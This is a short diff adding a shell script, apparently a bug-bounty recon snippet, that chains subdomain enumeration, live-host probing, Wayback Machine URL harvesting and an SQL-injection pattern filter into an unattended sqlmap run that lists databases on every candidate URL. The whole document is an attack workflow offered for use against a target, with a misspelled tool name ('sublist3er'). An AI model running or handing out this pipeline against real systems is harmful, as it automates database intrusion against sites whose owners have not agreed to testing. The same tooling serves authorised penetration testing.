@@ -1,0 +1,8 @@
+
+# Quick dirty find sqli by checking old pages and seeings thats still active. It is a crapshoot
+
+sublist3er -d target | tee -a domains
+cat domains | httpx | tee -a alive
+cat alive | waybackurls | tee -a urls
+gfsqli urls >> sqli
+sqlmap -m sqli --dbs --batch 
